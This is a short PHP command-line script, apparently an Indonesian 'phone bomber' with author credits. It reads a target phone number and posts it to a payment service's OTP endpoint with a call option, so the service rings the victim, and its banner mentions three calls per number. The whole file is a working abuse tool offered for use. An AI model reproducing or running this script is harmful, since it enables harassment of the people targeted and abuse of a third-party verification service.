<?php
// rek naon ??
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        
        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
    $R  = "\e[91m";
    $RR = "\e[91;7m";
    $G  = "\e[92m";
    $GG = "\e[92;7m";
    $B  = "\e[36m";
    $BB = "\e[36;7m";
    $Y  = "\e[93m";
    $YY = "\e[93;7m";
    $X  = "\e[0m\n";

system ("clear");        

echo $R.  "#############################\n";
echo $R.  "   #### BOM TELPON ####\n";
echo $R.  "#############################\n";
echo $Y.        " Author : Clnx777\n";
echo $Y.        " Github : https://github.com/andrachocs\n\n";
echo            "//limit 3x setiap satu no tlpon//\n";
echo "Masukan Nomor tlpn\n";
echo "Nomor : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute
?>
    